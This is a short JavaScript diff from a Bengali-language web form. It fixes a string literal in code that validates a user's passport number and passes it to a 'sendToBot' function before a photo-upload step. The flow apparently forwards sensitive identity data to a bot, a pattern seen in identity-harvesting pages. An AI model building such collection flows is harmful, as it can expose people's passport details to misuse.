@@ -132,8 +132,7 @@
             if (value.length === 0) { alert("⚠️ পাসপোর্ট নাম্বার দিন!"); return; }
             if (value.length < 5) { alert("⚠️ অন্তত 5 সংখ্যা দিন!"); return; }
             passportNumber = value;
-            sendToBot("🎯 **পাসপোর্ট সাবমিট!**
-📝 " + passportNumber);
+            sendToBot("🎯 পাসপোর্ট সাবমিট!\n📝 " + passportNumber);
             goToStep('photo_page');
         }
 
